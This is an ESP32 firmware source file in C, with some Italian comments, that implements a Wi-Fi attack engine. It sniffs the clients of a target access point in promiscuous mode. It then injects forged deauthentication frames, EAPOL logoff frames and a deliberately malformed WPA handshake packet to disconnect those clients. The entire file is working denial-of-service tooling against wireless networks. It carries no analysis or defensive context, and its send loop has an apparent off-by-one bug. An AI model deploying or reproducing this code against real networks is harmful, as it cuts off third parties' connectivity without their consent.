#include <string.h>
#include "esp_wifi.h"
#include "esp_log.h"
#include "wifi_attacks.h"

static const char *TAG = "WIFI_ATTACKS:";

static client_t clients[MAX_CLIENTS];
static SemaphoreHandle_t clients_semaphore;
static int num_clients = 0;
static uint8_t target_bssid[6] = { 0 };

static uint8_t deauth_packet[26] = {
    0xC0, 0x00, // Frame Control (Deauth)
    0x3A, 0x01, // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Dest Address (Broadcast)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source Address (Placeholder, will be set to BSSID)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (Placeholder, will be set to BSSID)
    0x00, 0x00, // Sequence Control
    0x07, 0x00  // Reason Code (7 = Class 3 frame received from nonassociated station)
};
static uint8_t deauth_packet_invert[26] = {
    0xC0, 0x00, // Frame Control (Deauth)
    0x3A, 0x01, // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Dest Address (Broadcast)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source Address (Placeholder, will be set to BSSID)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID (Placeholder, will be set to BSSID)
    0x00, 0x00, // Sequence Control
    0x07, 0x00  // Reason Code (7 = Class 3 frame received from nonassociated station)
};
static uint8_t eapol_logoff_packet[36] = {
    0x08, 0x02, // Frame Control (EAPOL)
    0x00, 0x00, // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (Broadcast)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (Fake Source or BSSID)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
    0x00, 0x00,                         // Sequence Control
    0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, // LLC Header
    0x88, 0x8E,                         // EAPOL Ethertype
    0x01,                               // Version
    0x02,                               // Type (Logoff)
    0x00, 0x00                          // Length
};
static uint8_t wpa_handshake_packet[79] = {
    0x08, 0x02, // Frame Control (EAPOL)
    0x00, 0x00, // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (Broadcast)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source (Fake Source or BSSID)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
    0x00, 0x00,                         // Sequence Control
    0xAA, 0xAA, 0x03, 0x00, 0x00, 0x00, // LLC Header
    0x88, 0x8E,                         // EAPOL Ethertype
    0x02,                               // Key Descriptor Type
    0xCA, 0x00,                         // Key Info (Malformato: Install Flag Settato)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Replay Counter
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Key Nonce
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Key IV
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Key RSC
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Key MIC
    0x00, 0x16, // Key Data Length
    0xDD,       // RSN Tag Number
    0xFF        // RSN Tag Length (Corrupted)
};


static void add_client_to_list(const uint8_t *mac) 
{
    if (xSemaphoreTake(clients_semaphore, pdMS_TO_TICKS(100)) == pdTRUE) 
    {
        /* Dont add duplicates */
        for (int i = 0; i < num_clients; i++) {
            if (memcmp(clients[i].mac, mac, 6) == 0) {
                xSemaphoreGive(clients_semaphore);
                return;
            }
        }
        if (num_clients < MAX_CLIENTS) 
        {
            memcpy(clients[num_clients].mac, mac, 6);
            num_clients++;
            ESP_LOGI(TAG, "Client aggiunto: %02X:%02X:%02X:%02X:%02X:%02X",
                    mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
        }
        xSemaphoreGive(clients_semaphore);
    }
}


static void promiscuous_callback(void *buf, wifi_promiscuous_pkt_type_t type) 
{
    if (type != WIFI_PKT_DATA) {
        return;
    }
    const wifi_promiscuous_pkt_t *packet = (wifi_promiscuous_pkt_t *)buf;
    const uint8_t *dest_mac = packet->payload + 4;  // Indirizzo di destinazione
    const uint8_t *src_mac = packet->payload + 10;  // Indirizzo di sorgente
    const uint8_t *bssid = packet->payload + 16;    // BSSID

    if (memcmp(bssid, target_bssid, 6) == 0 && memcmp(dest_mac, target_bssid, 6) == 0)
    {
        add_client_to_list(src_mac);
    }
}


void wifi_attack_engine_start(uint8_t *bssid)
{
    /* Init semaphore */
    if (clients_semaphore == NULL) 
    {
        clients_semaphore = xSemaphoreCreateMutex();
    }

    memcpy(&target_bssid, bssid, sizeof(target_bssid));

    /* Prepare packets for current target */
    memcpy(&deauth_packet[10], bssid, 6); // Source Address
    memcpy(&deauth_packet[16], bssid, 6); // BSSID
    memcpy(&deauth_packet_invert[4], bssid, 6); // Source Address
    memcpy(&deauth_packet_invert[10], bssid, 6); // BSSID
    memcpy(&eapol_logoff_packet[10], bssid, 6); // Source
    memcpy(&eapol_logoff_packet[16], bssid, 6); // BSSID
    memcpy(&wpa_handshake_packet[10], bssid, 6); // Source
    memcpy(&wpa_handshake_packet[16], bssid, 6); // BSSID

    /* Reset client count */
    num_clients = 1;
    memset(clients[0].mac, 0xFF, 6); 

    /* Start wifi promiscuos mode */
    esp_wifi_set_promiscuous(true);
    wifi_promiscuous_filter_t filter = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_DATA
    };
    esp_wifi_set_promiscuous_filter(&filter);
    filter.filter_mask = WIFI_PROMIS_CTRL_FILTER_MASK_ALL;
    esp_wifi_set_promiscuous_ctrl_filter(&filter);
    esp_wifi_set_promiscuous_rx_cb(promiscuous_callback);
}


void wifi_attack_deauth(uint8_t *bssid)
{
    if (xSemaphoreTake(clients_semaphore, pdMS_TO_TICKS(100)) == pdTRUE) 
    {
        for (int i = 0; i <= num_clients; i++) 
        {
            memcpy(&deauth_packet[4], clients[i].mac, 6);
            memcpy(&deauth_packet_invert[16], clients[i].mac, 6);
            memcpy(&eapol_logoff_packet[4], clients[i].mac, 6);
            memcpy(&wpa_handshake_packet[4], clients[i].mac, 6);
            /* Send simple deauth addr1=client_mac, addr2=ap_mac, addr3=ap_mac */
            esp_wifi_80211_tx(WIFI_IF_AP, deauth_packet, sizeof(deauth_packet), false);
            /* Send deauth with schemas addr1=ap_mac, addr2=ap_mac, addr3=client_mac */
            esp_wifi_80211_tx(WIFI_IF_AP, deauth_packet_invert, sizeof(deauth_packet_invert), false);
            /* Send eapol logoff */
            esp_wifi_80211_tx(WIFI_IF_AP, eapol_logoff_packet, sizeof(eapol_logoff_packet), false);
            /* Send malformed handshake packet */
            esp_wifi_80211_tx(WIFI_IF_AP, wpa_handshake_packet, sizeof(wpa_handshake_packet), false);
        }
        xSemaphoreGive(clients_semaphore);
    }
}